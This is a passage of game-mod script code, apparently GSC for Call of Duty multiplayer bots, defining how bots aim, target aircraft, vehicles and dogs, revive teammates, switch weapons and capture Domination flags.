{
	self notify("bots_aim_overlap");
	self endon("bots_aim_overlap");
	self endon("disconnect");
	self endon("death");
	level endon ( "game_ended" );
	
	myAngle=self getPlayerAngles();
	
	X=(angles[0]-myAngle[0]);
	while(X > 170.0)
		X=X-360.0;
	while(X < -170.0)
		X=X+360.0;
	X=X/speed;
	
	Y=(angles[1]-myAngle[1]);
	while(Y > 180.0)
		Y=Y-360.0;
	while(Y < -180.0)
		Y=Y+360.0;
		
	Y=Y/speed;
	
	for(i=0;i<speed;i++)
	{
		newAngle=(myAngle[0]+X,myAngle[1]+Y,0);
		self setPlayerAngles(newAngle);
		myAngle=self getPlayerAngles();
		wait 0.05;
	}
}

/*
	Bot attacks the plane
*/
bot_plane_attack(plane)
{
	plane endon("death");
	plane endon("delete");
	plane endon("leaving");

	weap = self getLockonAmmo();

	if (!isDefined(weap))
		return;

	self thread botStopMove(true);

	if(weap == "strela_mp")
	{
		self freeze_player_controls(true);
		
		self SetSpawnWeapon( weap );
		
		if(!self GetWeaponAmmoClip(weap))
		{
			self SetWeaponAmmoClip(weap, 1);
			self SetWeaponAmmoStock(weap, self GetWeaponAmmoStock(weap)-1);
		}
	}
	else
	{
		if (!self ChangeToWeapon(weap))
			return;
		
		if(!self GetWeaponAmmoClip(weap))
		{
			self PressAttackButton();
			self wait_endon(10, "reload");
		}
		
		self freeze_player_controls(true);
	}

	wait_time = 0;
	lock_time = 0;

	while (wait_time < 2)
	{
		wait 0.05;

		if(!self GetWeaponAmmoClip(weap))
			return;
		
		if(self getCurrentWeapon() != weap)
			return;
		
		if(self InLastStand())
			return;
		
		if ( !IsDefined( plane ) )
			return;

		if ( !IsAlive( plane ) )
			return;

		if ( !BulletTracePassed( self getEye(), plane.origin, false, plane ) )
		{
			wait_time += 0.05;
			lock_time = 0;
		}
		else
		{
			wait_time = 0;
			lock_time += 0.05;

			self thread bot_lookat(VectorToAngles(((plane.origin-self.origin)-(anglesToForward(self getplayerangles())))), 4);

			if(lock_time >= 2)
			{
				self SetWeaponAmmoClip(weap, self GetWeaponAmmoClip(weap)-1);
				
				missile = MagicBullet( weap, self getEye(), plane.origin, self );
				missile Missile_SetTarget( plane );
				
				level notify ( "missile_fired", self, missile, plane, true );
				self notify("bots_aim_overlap");
				
				wait 1;
				return;
			}
		}
	}
}

/*
	Bots think to kill vehicles
*/
bot_target_vehicle()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon ( "game_ended" );

	myteam = self.pers[ "team" ];

	for (;;)
	{
		wait( 1 );
		
		if(isDefined(self GetThreat()) || self IsRemoteControlling() || self UseButtonPressed())
			continue;
		
		airborne_enemies = GetEntArray( "script_vehicle", "classname" );
		target = undefined;
		myEye = self getEye();
		rocketAmmo = self getRocketAmmo();
		for ( i = 0; i < airborne_enemies.size; i++ )
		{
			enemy = airborne_enemies[i];

			if ( !IsDefined( enemy ) )
			{
				continue;
			}

			if ( !IsAlive( enemy ) )
			{
				continue;
			}

			if ( level.teamBased )
			{
				if ( enemy.team == myteam )
				{
					continue;
				}
			}

			if ( enemy.owner == self )
			{
				continue;
			}

			if ( !IsDefined( enemy.targetname ) || enemy.targetname != "rcbomb" )
			{
				if ( !isDefined(rocketAmmo) )
				{
					continue;
				}
			}

			if ( !BulletTracePassed( myEye, enemy.origin, false, enemy ) )
			{
				continue;
			}

			target = enemy;
			break;
		}
		
		if(!isDefined(target))
		{
			if(isDefined(self getLockonAmmo()))
			{
				for(i = 0; i < level.bot_planes.size; i++)
				{
					enemy = level.bot_planes[i];
					
					if ( !IsDefined( enemy ) )
					{
						continue;
					}

					if ( !IsAlive( enemy ) )
					{
						continue;
					}
					
					if ( level.teamBased )
					{
						if ( enemy.team == myteam )
						{
							continue;
						}
					}

					if ( enemy.owner == self )
					{
						continue;
					}
					
					if ( !BulletTracePassed( myEye, enemy.origin, false, enemy ) )
					{
						continue;
					}
					
					target = enemy;
					break;
				}
			}
		}
		
		if(!isDefined(target))
		{
			wait( RandomIntRange( 3, 5 ) );
			continue;
		}
		
		if(isDefined(target.bot_plane))
		{
			self bot_plane_attack(target);
			self freeze_player_controls(false);
			self thread botStopMove(false);
		}
		else
		{
			self SetScriptEnemy( target );
			self bot_vehicle_attack( target );
			self ClearScriptEnemy();
		}
	}
}

/*
	Bot uses their equipment
*/
bot_use_equipment_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon ( "game_ended" );

	weapon = self.pers["bot"]["class_equipment"];
	
	if(weapon == "" || weapon == "weapon_null_mp" || weapon == "satchel_charge_mp")
		return;

	for ( ;; )
	{
		wait( RandomIntRange( 1, 3 ) );

		if ( !self HasWeapon( weapon ) )
			return;

		if (!self GetAmmoCount(weapon))
			continue;

		if ( self IsRemoteControlling())
			continue;

		if ( isDefined(self getThreat()) )
			continue;

		if (self._is_sprinting)
			continue;

		diff = self GetBotDiffNum();

		if (diff > 0)
		{
			if ( weapon == "camera_spike_mp" )
			{
				if ( self GetLookaheadDist() < 384 )
					continue;

				view_angles = self GetPlayerAngles();

				if ( view_angles[0] < -5 )
					continue;
			}
			else
			{
				if ( self GetLookaheadDist() > 64 )
					continue;
			}
		}

		dir = self GetLookaheadDir();
		if ( !IsDefined( dir ) )
			continue;

		dir = VectorToAngles( dir );
		if ( abs( dir[1] - self.angles[1] ) > 5 )
			continue;

		dir = VectorNormalize( AnglesToForward( self.angles ) );
		dir = vector_scale( dir, 32 );
		goal = self.origin + dir;
		
		if (randomInt(100) > 35)
			continue;

		grenades = GetEntArray( "grenade", "classname" );
		anyEquNear = false;
		for ( i = 0; i < grenades.size; i++ )
		{
			item = grenades[i];

			if ( !IsDefined( item.name ) )
				continue;

			if ( !IsWeaponEquipment( item.name ) )
				continue;

			if ( DistanceSquared( item.origin, goal ) < 128 * 128 )
				anyEquNear = true;
		}

		if (anyEquNear && diff > 0)
			continue;

		lastWeap = self getCurrentWeapon();

		self thread botStopMove(true);

		if (self ChangeToWeapon(weapon))
		{
			self thread fire_current_weapon();

			ret = self waittill_any_timeout( 5, "grenade_fire" );
			self notify("stop_firing_weapon");

			self thread changeToWeapon(lastWeap);
		}

		self thread botStopMove(false);
	}
}

/*
	Bots go to the revive
*/
bot_go_revive(revive)
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon("game_ended");
	self endon( "goal" );
	self endon( "bad_path" );
	self endon( "new_goal" );

	for (;;)
	{
		wait 1;

		if (!isDefined(revive))
			break;

		if (!isDefined(revive.revivetrigger))
			break;

		if (self isTouching(revive.revivetrigger))
			break;
	}

	if(!isDefined(revive) || !isDefined(revive.revivetrigger))
		self notify("bad_path");
	else
		self notify("goal");
}

/*
	Bots go revive
*/
bot_revive_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon("game_ended");
	
	if ( !level.teamBased )
		return;
	
	for ( ;; )
	{
		wait( randomintrange( 3, 5 ) );

		if ( self HasScriptGoal() || self.bot_lock_goal )
			continue;

		if(self isDefusing() || self isPlanting())
			continue;

		if (self inLastStand())
			continue;

		if (self IsRemoteControlling())
			continue;

		if(self UseButtonPressed())
			continue;

		revivePlayer = undefined;
		for(i = 0; i < level.players.size; i++)
		{
			player = level.players[i];

			if(!isDefined(player.pers["team"]))
				continue;
			if(player == self)
				continue;
			if(self.pers["team"] != player.pers["team"])
				continue;
			if(!isDefined(player.revivetrigger))
				continue;

			if (isDefined(player.currentlyBeingRevived) && player.currentlyBeingRevived)
				continue;

			if (!isDefined(player.revivetrigger.bots))
				player.revivetrigger.bots = 0;

			if (player.revivetrigger.bots > 2)
				continue;

			revivePlayer = player;
		}

		if (!isDefined(revivePlayer))
			continue;

		self.bot_lock_goal = true;

		self SetBotGoal( revivePlayer.origin, 1 );
		self thread bot_inc_bots(revivePlayer.revivetrigger, true);
		self thread bot_go_revive(revivePlayer);
	
		event = self waittill_any_return( "goal", "bad_path", "new_goal" );

		if (event != "new_goal")
			self ClearBotGoal();
		
		if(event != "goal" || !isDefined(revivePlayer) || (isDefined(revivePlayer.currentlyBeingRevived) && revivePlayer.currentlyBeingRevived) || !self isTouching(revivePlayer.revivetrigger) || self InLastStand())
		{
			self.bot_lock_goal = false;
			continue;
		}
		
		self SetBotGoal( self.origin, 64 );
		
		reviveTime = GetDvarInt( #"revive_time_taken" );
		self PressUseButton( reviveTime + 1 );
		wait( reviveTime + 1.5 );

		self ClearBotGoal();
		self.bot_lock_goal = false;
	}
}

/*
	Bot attacks dog
*/
bot_dog_attack(dog)
{
	dog endon("death");
	
	wait_time = RandomIntRange( 7, 10 );

	for ( i = 0; i < wait_time; i++ )
	{
		wait( 1 );
		
		if ( !IsDefined( dog ) )
		{
			return;
		}
		
		if ( !IsAlive( dog ) )
		{
			return;
		}
		
		if ( !BulletTracePassed( self.origin, dog.origin, false, dog ) )
		{
			return;
		}
	}
}

/*
	Bot thinks to attack dogs
*/
bot_dogs_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon ( "game_ended" );

	myteam = self.pers[ "team" ];

	if ( level.no_dogs )
		return;

	for ( ;; )
	{
		wait( 0.25 );

		if ( !IsDefined( level.dogs ) || level.dogs.size <= 0 )
			level waittill( "called_in_the_dogs" );
		
		if(isDefined(self GetThreat()))
			continue;

		for ( i = 0; i < level.dogs.size; i++ )
		{
			dog = level.dogs[i];

			if ( !IsDefined( dog ) )
			{
				continue;
			}

			if ( !IsAlive( dog ) )
			{
				continue;
			}

			if ( level.teamBased )
			{
				if ( dog.aiteam == myteam )
				{
					continue;
				}
			}

			if ( dog.script_owner == self )
			{
				continue;
			}

			if ( DistanceSquared( self.origin, dog.origin ) < 1024 * 1024 )
			{
				if(!BulletTracePassed( self.origin, dog.origin, false, dog ))
					continue;
				
				self SetScriptEnemy( dog );
				self bot_dog_attack(dog);
				self ClearScriptEnemy();
				break;
			}
		}
	}
}

/*
	Clears goal when events death
*/
stop_go_target_on_death(tar)
{
	self endon( "death" );
	self endon( "disconnect" );
	self endon( "new_goal" );
	self endon( "bad_path" );
	self endon( "goal" );

	tar waittill_either("death", "disconnect");

	self ClearBotGoal();
}

/*
	Goes to the target's location if it had one
*/
follow_target()
{
	self endon( "death" );
	self endon( "disconnect" );
	
	for(;;)
	{
		wait 1;
		
		if ( self HasScriptGoal() || self.bot_lock_goal )
			continue;
		
		threat = self GetThreat();

		if ( !isDefined(threat) )
			continue;

		if (!isPlayer(threat))
			continue;

		if(randomInt(100) > 50)
			continue;

		self thread stop_go_target_on_death(threat);

		self SetBotGoal(threat.origin, 64);
		if (self waittill_any_return("new_goal", "goal", "bad_path") != "new_goal")
			self ClearBotGoal();
	}
}

/*
	Bots will think to switch weapons
*/
bot_weapon_think()
{
	self endon("death");
	self endon("disconnect");
	level endon("game_ended");
	
	for(;;)
	{
		self waittill_any_timeout(randomIntRange(2, 4), "bot_force_check_switch");
			
		if(self isDefusing() || self isPlanting())
			continue;

		if (self IsRemoteControlling())
			continue;

		if (self InLastStand())
			continue;

		curWeap = self GetCurrentWeapon();
		threat = self getThreat();

		if (isDefined(threat) && !isPlayer(threat))
			continue;
		
		if(curWeap != "none" && self getAmmoCount(curWeap) && curWeap != "strela_mp")
		{
			if(randomInt(100) > 2)
				continue;
				
			if(isDefined(threat))
				continue;
		}
		
		weaponslist = self getweaponslist();
		weap = "";
		while(weaponslist.size)
		{
			weapon = weaponslist[randomInt(weaponslist.size)];
			weaponslist = array_remove(weaponslist, weapon);
			
			if(!self getAmmoCount(weapon))
				continue;
					
			if (!maps\mp\gametypes\_weapons::isPrimaryWeapon( weapon ) && !maps\mp\gametypes\_weapons::isSideArm( weapon ))
				continue;
				
			if(curWeap == weapon || weapon == "none" || weapon == "" || weapon == "strela_mp")
				continue;
				
			weap = weapon;
			break;
		}
		
		if(weap == "")
			continue;
		
		self SwitchToWeapon(weap);
	}
}

/*
	Bots pay attention to the uav
*/
bot_uav_think()
{
	/*self endon( "death" );
	self endon( "disconnect" );
	level endon("game_ended");
	
	myTeam = self.pers[ "team" ];		
	otherTeam = getOtherTeam( myTeam );
	diff = self GetBotDiffNum();
	
	wasFooled = false;
	for(;;)
	{
		wait 0.75;
		
		if ( self HasScriptGoal() )
			continue;
		
		if ( self IsRemoteControlling() || self.bot_lock_goal )
		{
			continue;
		}
		
		hasCam = isDefined(self.cameraSpike);
		
		if(self.bot_scrambled && !hasCam)
			continue;
		
		players = get_players();
		
		hasUAV = false;
		hasSR = false;
		if(level.teamBased)
		{
			if(level.activeCounterUAVs[otherTeam] && !hasCam)
				continue;
			
			hasSR = level.activeSatellites[myTeam];
			hasUAV = level.activeUAVs[myTeam];
		}
		else
		{
			shouldContinue = false;
			
			for (i = 0; i < players.size; i++)
			{
				player = players[i];
				
				if(player == self)
					continue;
					
				if(!isDefined(player.team))
					continue;
				
				if(isDefined(level.activeCounterUAVs[player.entnum]) && level.activeCounterUAVs[player.entnum])
					continue;
				
				shouldContinue = true;
				break;
			}
					
			if(shouldContinue && !hasCam)
				continue;
			
			hasSR = level.activeSatellites[self.entnum];
			hasUAV = level.activeUAVs[self.entnum];
		}
		
		if(level.hardcoreMode && !hasUAV && !hasSR && !hasCam)
			continue;
		
		dist = GetDvarInt( #"scr_help_dist" );
		dist = dist * dist * 8;
		
		if(!wasFooled && level.bot_decoys.size && !hasCam)
		{
			shouldContinue = false;
			
			for(i = 0; i < level.bot_decoys.size; i++)
			{
				g = level.bot_decoys[i];
				
				if(isDefined(g.owner) && g.owner == self)
					continue;
				
				if(level.teamBased && g.team == myTeam)
					continue;
				
				if(DistanceSquared(self.origin, g.origin) > dist)
					continue;
				
				if(lengthsquared( g getVelocity() ) > 10000)
					continue;
				
				if(diff > 0)
					wasFooled = true;
				
				self SetBotGoal( g.origin, 128 );
				
				if (self waittill_any_return( "goal", "bad_path", "new_goal" ) != "new_goal")
					self ClearScriptGoal();
				
				shouldContinue = true;
				break;
			}
			
			if(shouldContinue)
				continue;
		}
		
		if ( diff <= 0 )
		{
			continue;
		}
		
		for (i = 0; i < players.size; i++)
		{
			player = players[i];
			
			if(player == self)
				continue;
			
			if(level.teambased && player.team == myTeam)
				continue;
			
			if(!isAlive(player))
				continue;
				
			if(player.sessionstate != "playing")
				continue;
			
			if(DistanceSquared(self.origin, player.origin) > dist)
				continue;
			
			if(hasCam)
			{
				if(!self.cameraSpike maps\mp\gametypes\_weaponobjects::isStunned())
				{
					if ( VectorDot( VectorNormalize( AnglesToForward( self.cameraSpike.cameraHead.angles ) ), VectorNormalize( player.origin - self.cameraSpike.origin ) ) >= 0.342 && SightTracePassed(player.origin+(0,0,5), self.cameraSpike.origin+(0,0,5), false, self.cameraSpike) && !player hasPerk("specialty_nottargetedbyai")) // cos 70 degrees
					{
						self.did = "bot_uav_think(3)";
						self SetScriptGoal( player.origin, 128 );

						if(DistanceSquared(player.origin, self.origin) > 128*128)
						{
							self waittill_any( "goal", "bad_path" );
						}
						
						self ClearScriptGoal();
						break;
					}
				}
			}
			else if(hasSR || (!isSubStr(player getCurrentWeapon(), "_silencer_") && player.bot_firing) || (hasUAV && !player hasPerk("specialty_gpsjammer")) || (isDefined(self.acousticSensor) && !self.acousticSensor maps\mp\gametypes\_weaponobjects::isStunned() && !player hasPerk("specialty_nomotionsensor") && distance2d(self.acousticSensor.origin, player.origin) < 666))
			{
				self.did = "bot_uav_think(2)";
				self SetScriptGoal( player.origin, 128 );

				if(DistanceSquared(player.origin, self.origin) > 128*128)
				{
					self waittill_any( "goal", "bad_path" );
				}
				
				self ClearScriptGoal();
				break;
			}
		}
	}*/
}

/*
	bots will go to their target's kill location
*/
bot_revenge_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	
	if(!isDefined(self.killerLocation))
		return;

	loc = self.killerLocation;

	for(;;)
	{
		wait( RandomIntRange( 1, 5 ) );
		
		if(self HasScriptGoal() || self.bot_lock_goal)
			return;
		
		if ( randomint( 100 ) < 75 )
			return;
		
		self SetBotGoal( loc, 64 );

		if (self waittill_any_return( "goal", "bad_path", "new_goal" ) != "new_goal")
			self ClearBotGoal();
	}
}

/*
	Bots will listen to foot steps and target nearby targets
*/
bot_listen_to_steps()
{
	self endon("disconnect");
	self endon("death");
	
	for(;;)
	{
		wait 1;
			
		dist = 100;
		if(self hasPerk("specialty_loudenemies"))
			dist *= 1.4;
		
		dist *= dist;
		
		heard = undefined;
		for(i = level.players.size-1 ; i >= 0; i--)
		{
			player = level.players[i];

			if(player == self)
				continue;

			if (!isDefined(player.team))
				continue;

			if(level.teamBased && self.team == player.team)
				continue;
			if(player.sessionstate != "playing")
				continue;
			if(!isAlive(player))
				continue;

			if( lengthsquared( player getVelocity() ) < 20000 )
				continue;
			
			if( distanceSquared(player.origin, self.origin) > dist )
				continue;
			
			if( player hasPerk("specialty_quieter"))
				continue;
				
			heard = player;
			break;
		}
		
		if(!IsDefined(heard))
			continue;
		
		if(bulletTracePassed(self getEye(), heard getTagOrigin( "j_spineupper" ), false, heard))
		{
			self setAttacker(heard);
			continue;
		}
		
		if (self HasScriptGoal() || self.bot_lock_goal)
			continue;
		
		self SetBotGoal( heard.origin, 64 );

		if (self waittill_any_return( "goal", "bad_path", "new_goal" ) != "new_goal")
			self ClearBotGoal();
	}
}

/*
	Presses the buttons on radiation
*/
bot_radiation_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon ( "game_ended" );

	if ( level.script != "mp_radiation" )
		return;

	if ( level.wagerMatch )
		return;

	origins = [];
	origins[0] = ( 813, 5, 267 );
	origins[1] = ( -811, 30, 363 );

	for ( ;; )
	{
		wait( RandomIntRange( 8, 15 ) );
		
		if ( self HasScriptGoal() )
			continue;
		
		if ( self IsRemoteControlling() || self.bot_lock_goal )
			continue;

		if (self UseButtonPressed())
			continue;

		origin = random( origins );

		if ( DistanceSquared( self.origin, origin ) < 512 * 512 )
		{
			self SetBotGoal( origin, 32 );
			
			event = self waittill_any_return( "goal", "bad_path", "new_goal" );

			if (event != "new_goal")
				self ClearBotGoal();
			
			if(event != "goal")
				continue;
			
			self SetBotGoal( self.origin, 32 );
			
			self PressUseButton( 3 );
			wait( 3 );
			
			self ClearBotGoal();
		}

		wait( RandomIntRange( 5, 10 ) );
	}
}

/*
	Bots hang around the enemy's flag to spawn kill em
*/
bot_dom_spawn_kill_think()
{
	self endon( "death" );
	self endon( "disconnect" );

	if ( level.gametype != "dom" )
		return;

	myTeam = self.pers[ "team" ];		
	otherTeam = getOtherTeam( myTeam );

	for ( ;; )
	{
		wait( randomintrange( 10, 20 ) );
		
		if ( randomint( 100 ) < 20 )
			continue;
		
		if ( self HasScriptGoal() || self.bot_lock_goal)
			continue;
		
		myFlagCount = maps\mp\gametypes\dom::getTeamFlagCount( myTeam );

		if ( myFlagCount == level.flags.size )
			continue;

		otherFlagCount = maps\mp\gametypes\dom::getTeamFlagCount( otherTeam );
		
		if (myFlagCount <= otherFlagCount || otherFlagCount != 1)
			continue;
		
		flag = undefined;
		for ( i = 0; i < level.flags.size; i++ )
		{
			if ( level.flags[i] maps\mp\gametypes\dom::getFlagTeam() == myTeam )
				continue;
		}
		
		if(!isDefined(flag))
			continue;
		
		if(DistanceSquared(self.origin, flag.origin) < 2048*2048)
			continue;

		self SetBotGoal( flag.origin, 1024 );
		
		self thread bot_dom_watch_flags(myFlagCount, myTeam);

		if (self waittill_any_return( "goal", "bad_path", "new_goal" ) != "new_goal")
			self ClearBotGoal();
	}
}

/*
	Calls 'bad_path' when the flag count changes
*/
bot_dom_watch_flags(count, myTeam)
{
	self endon( "death" );
	self endon( "disconnect" );
	self endon( "goal" );
	self endon( "bad_path" );
	self endon( "new_goal" );

	for (;;)
	{
		wait 0.5;

		if (maps\mp\gametypes\dom::getTeamFlagCount( myTeam ) != count)
			break;
	}
		
	self notify("bad_path");
}

/*
	Bots watches their own flags and protects them when they are under capture
*/
bot_dom_def_think()
{
	self endon( "death" );
	self endon( "disconnect" );

	if ( level.gametype != "dom" )
		return;

	myTeam = self.pers[ "team" ];

	for ( ;; )
	{
		wait( randomintrange( 1, 3 ) );
		
		if ( randomint( 100 ) < 35 )
			continue;
		
		if ( self HasScriptGoal() || self.bot_lock_goal )
			continue;
		
		flag = undefined;
		for ( i = 0; i < level.flags.size; i++ )
		{
			if ( level.flags[i] maps\mp\gametypes\dom::getFlagTeam() != myTeam )
				continue;
			
			if ( !level.flags[i].useObj.objPoints[myTeam].isFlashing )
				continue;
			
			if ( !isDefined(flag) || DistanceSquared(self.origin,level.flags[i].origin) < DistanceSquared(self.origin,flag.origin) )
				flag = level.flags[i];
		}
		
		if ( !isDefined(flag) )
			continue;

		self SetBotGoal( flag.origin, 128 );
		
		self thread bot_dom_watch_for_flashing(flag, myTeam);
		self thread bots_watch_touch_obj(flag);

		if (self waittill_any_return( "goal", "bad_path", "new_goal" ) != "new_goal")
			self ClearBotGoal();
	}
}

/*
	Watches while the flag is under capture
*/
bot_dom_watch_for_flashing(flag, myTeam)
{
	self endon( "death" );
	self endon( "disconnect" );
	self endon( "goal" );
	self endon( "bad_path" );
	self endon( "new_goal" );
		
	for (;;)
	{
		wait 0.5;

		if (!isDefined(flag))
			break;

		if (flag maps\mp\gametypes\dom::getFlagTeam() != myTeam || !flag.useObj.objPoints[myTeam].isFlashing)
			break;
	}
		
	self notify("bad_path");
}

/*
	Bots capture dom flags
*/
bot_dom_cap_think()
{
	self endon( "death" );
	self endon( "disconnect" );
		
	if ( level.gametype != "dom" )
		return;

	myTeam = self.pers[ "team" ];		
	otherTeam = getOtherTeam( myTeam );

	for ( ;; )
	{
		wait( randomintrange( 3, 12 ) );
		
		if ( self.bot_lock_goal )
		{
			continue;
		}

		if ( !isDefined(level.flags) || level.flags.size == 0 )
			continue;

		myFlagCount = maps\mp\gametypes\dom::getTeamFlagCount( myTeam );

		if ( myFlagCount == level.flags.size )
			continue;

		otherFlagCount = maps\mp\gametypes\dom::getTeamFlagCount( otherTeam );

		if ( myFlagCount < otherFlagCount )
		{
			if ( randomint( 100 ) < 15 )
				continue;
		}
		else if ( myFlagCount == otherFlagCount )
		{
			if ( randomint( 100 ) < 35 )
				continue;	
		}
		else if ( myFlagCount > otherFlagCount )
		{
			if ( randomint( 100 ) < 95 )
				continue;
		}

		flag = undefined;
		flags = [];
		for ( i = 0; i < level.flags.size; i++ )
		{
			if ( level.flags[i] maps\mp\gametypes\dom::getFlagTeam() == myTeam )
				continue;

			flags[flags.size] = level.flags[i];
		}

		if (randomInt(100) > 30)
		{
			for ( i = 0; i < flags.size; i++ )
			{
				if ( !isDefined(flag) || DistanceSquared(self.origin,level.flags[i].origin) < DistanceSquared(self.origin,flag.origin) )
					flag = level.flags[i];
			}
		}
		else if (flags.size)
		{
			flag = random(flags);
		}

		if ( !isDefined(flag) )
			continue;
		
		self.bot_lock_goal = true;
		self SetBotGoal( flag.origin, 64 );
		
		self thread bot_dom_go_cap_flag(flag, myteam);
		
		event = self waittill_any_return( "goal", "bad_path", "new_goal" );
		
		if (event != "new_goal")
			self ClearBotGoal();

		if (event != "goal")
		{
			self.bot_lock_goal = false;
			continue;
		}
		
		self SetBotGoal( self.origin, 64 );

		while ( flag maps\mp\gametypes\dom::getFlagTeam() != myTeam && self isTouching(flag) )
		{
			cur = flag.useObj.curProgress;
			wait 0.5;
			
			if(flag.useObj.curProgress == cur)
				break;//some enemy is near us, kill him
		}

		self ClearBotGoal();
		
		self.bot_lock_goal = false;
	}
}

/*
	Bot goes to the flag, watching while they don't have the flag
*/
bot_dom_go_cap_flag(flag, myteam)
{
	self endon( "death" );
	self endon( "disconnect" );
	self endon( "goal" );
	self endon( "bad_path" );
	self endon( "new_goal" );
		
	for (;;)
	{
		wait randomintrange(2,4);

		if (!isDefined(flag))
			break;

		if (flag maps\mp\gametypes\dom::getFlagTeam() == myTeam)
			break;

		if (self isTouching(flag))
			break;
	}
		
	if (flag maps\mp\gametypes\dom::getFlagTeam() == myTeam)
		self notify("bad_path");
	else
		self notify("goal");
}
